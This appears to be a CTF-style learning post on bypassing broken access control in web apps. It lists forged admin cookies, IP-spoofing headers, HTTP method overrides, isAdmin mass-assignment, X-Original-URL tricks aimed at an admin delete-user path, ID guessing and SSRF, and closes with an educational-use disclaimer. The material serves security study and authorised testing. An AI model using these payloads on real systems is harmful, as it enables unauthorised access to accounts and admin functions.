---
title: BROKEN ACCESS CONTROL
date: 2023-05-10 23:40:20 +/-TTTT
categories: [learning, web]
tags: [ctf]     # TAG names should always be lowercase
---

The attacking methodology of broken access control in web applications. If we got 401 or 403 HTTP response, try to bypass it using the following methods in this post.

# Change Header Values

`Cookie`

We may be able to get access to the login-required pages.

```
Cookie: admin=true
Cookie: isAdmin=true
Cookie: access=1
Cookie: access=true
```

# IP Spoofing

```
Cluster-Client-IP: 127.0.0.1
Forwarded-For: 127.0.0.1
X-Forwarded: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Original-URL: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-ProxyUser-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Remote-IP: 127.0.0.1

Host: 127.0.0.1
```

# Change Methods

```
GET, POST, PUT, DELETE, HEAD, TRACE, OPTIONS, PATCH, INVENTED, CONNECT, etc.

# Override to bypass FireWall (via POST /example HTTP/1.1)
X-Method-Override: PUT
X-HTTP-Method-Override: PUT
```

# POST Parameters

```
POST / HTTP/1.1
...

{
    "email": "new-email@example.com",
    "isAdmin": true
}
```

# X-Original-URL, X-Rewrite-URL

```
POST / HTTP/1.1

...
X-Original-URL: /admin/deleteuser
# or
X-Rewrite-URL: /admin/deleteuser
...

username=michael
```

# GET Parameters

```
https://vulnerable.com/account?id=michael
https://vulnerable.com/account?id=admin
https://vulnerable.com/account?id=administrator

# GUID cannot be guessed but it may be found somewhere in the website.
https://vulnerable.com/account?id=7230b2a9-60de-4409-a350-cd14986a8d3e
https://vulnerable.com/account?id=1de655cb-29d7-4008-b434-e688b39f9564
```

# Access Page via SSRF

If there is another website that is owned by same orginazation, we may be able to see the target website with SSRF.

```
https://example.com?url=https://admin.example.com/
```

# Disclaimer
```
Exploit Notes are only for educational purpose or penetration testing, not attacking servers that you're not authorized. This site will not take any responsibility even if you attack the server illegally or cause damage unintentionally. Please use the contents in this site at your own risk.
The contents of this site are not original, but based on the information on the internet, the author actually tried and functioned. Although the author strives to post the latest information on the content of this site as much as possible, there is no guarantee that it will always be new.
```